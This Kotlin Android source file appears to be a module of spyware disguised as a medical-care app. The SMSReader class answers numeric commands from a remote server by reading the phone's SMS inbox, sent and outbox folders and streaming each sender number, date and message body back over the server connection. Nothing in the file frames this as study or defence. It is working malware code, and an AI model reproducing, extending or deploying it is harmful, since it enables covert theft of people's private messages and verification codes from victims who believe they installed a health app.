package com.example.medicalcare.features.network.commands

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.example.medicalcare.features.network.connection.ConfigNetwork
import java.io.DataOutputStream
import java.util.Date

class SMSReader(private val context: Context) : CommandHandler {
    override fun handle(command: String, toServer: DataOutputStream) {
        val box = when (command) {
            "1" -> "inbox"
            "2" -> "sent"
            "3" -> "outbox"
            else -> return
        }
        val result = readSMSBox(box)
        toServer.writeBytes("[>] SMS $box:\r\n$result")
    }

    private fun readSMSBox(box: String): String {
        val smsUri = Uri.parse("${ConfigNetwork.SMS_URL}$box")
        val sb = StringBuilder()
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(smsUri, null, null, null, null)
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    val number = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
                    val epoch = date.toLongOrNull() ?: 0L
                    val fDate = Date(epoch)
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    sb.append("[$number:$fDate] $body\n")
                } while (cursor.moveToNext())
            }
        } catch (se: SecurityException) {
            Log.e("SMSReader", "Missing READ_SMS permission", se)
            return "[!] Permission denied for SMS access\n"
        } finally {
            cursor?.close()
        }
        return sb.toString()
    }
}